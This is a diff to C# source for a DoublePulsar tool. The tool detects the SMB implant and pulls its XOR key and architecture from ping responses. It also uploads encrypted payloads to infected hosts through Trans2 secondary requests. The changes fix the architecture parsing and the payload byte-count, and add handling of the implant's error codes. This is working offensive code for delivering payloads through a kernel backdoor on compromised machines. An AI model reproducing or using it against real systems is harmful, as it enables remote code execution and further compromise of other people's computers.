@@ -723,7 +723,14 @@ namespace DoublePulsar
                 byte[] signature = Slice(pingrequestresponse, 14, 4);
                 UInt32 signature_long = LE2INT(signature);
                 UInt32 key = calculate_doublepulsar_xor_key(signature_long);
-                string arch = calculate_doublepulsar_arch(signature_long);
+                //string arch = calculate_doublepulsar_arch(signature_long);
+
+                //this extracts the last 4 bytes of the SMB signature
+				//using this method instead of the full 8 bytes because LE2INT cannot handle more than 4 bytes
+                byte[] arch_signature = Slice(pingresponse, 18, 4);
+				UInt32 archbytes_long = LE2INT(arch_signature);
+				string arch = calculate_doublepulsar_arch(archbytes_long);
+                
 
                 Console.WriteLine($"DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: 0x{key,4:X}");
 
@@ -1170,6 +1177,17 @@ namespace DoublePulsar
                         {
                             System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned {recv_buffer[34]}.  SUCCESS!");
                         }
+                        else if (recv_buffer[34] == 0x62)
+                        {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Invalid parameters!");
+                        }
+                        else if (recv_buffer[34] == 0x72)
+                        {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Allocation Error!");
+                        }
+                        else {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Error!");
+                        }                        
                     }
 
                     catch (Exception e)
@@ -1209,7 +1227,7 @@ namespace DoublePulsar
                     transaction2SecondaryRequest.TotalDataCount = (ushort)bytesLeft; // Marshal.SizeOf(encrypted_payload);
                     transaction2SecondaryRequest.DataCount = (ushort)bytesLeft; // Marshal.SizeOf(encrypted_payload);
 
-                    ushort byteCountOfEncryptedPayload = (ushort)(bytesLeft + 13); // Marshal.SizeOf(encrypted_payload) + 13;
+                    ushort byteCountOfEncryptedPayload = (ushort)(bytesLeft + 12); // Marshal.SizeOf(encrypted_payload) + 13;
                     transaction2SecondaryRequest.ByteCount = (ushort)byteCountOfEncryptedPayload;
 
                     byte[] transaction2SecondaryRequestbytes = GetBytes(transaction2SecondaryRequest).ToArray();
@@ -1278,6 +1296,17 @@ namespace DoublePulsar
                         {
                             System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned {recv_buffer[34]}.  SUCCESS!");
                         }
+                        else if (recv_buffer[34] == 0x62)
+                        {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Invalid parameters!");
+                        }
+                        else if (recv_buffer[34] == 0x72)
+                        {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Allocation Error!");
+                        }
+                        else {
+                            System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Error!");
+                        } 
                     }
 
                     catch (Exception e)
